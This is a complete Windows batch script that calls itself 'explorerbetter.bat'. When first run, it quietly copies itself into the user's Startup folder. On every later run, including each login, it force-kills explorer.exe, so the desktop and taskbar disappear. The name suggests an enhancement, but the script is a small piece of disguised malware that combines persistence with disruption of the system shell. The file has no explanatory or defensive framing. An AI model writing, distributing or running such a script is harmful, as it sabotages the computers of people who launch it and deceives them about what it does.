@echo off
if not exist "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\explorerbetter.bat" goto s
taskkill /f /im explorer.exe >nul 2>&1
exit
:s
copy explorerbetter.bat "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" >nul 2>&1
exit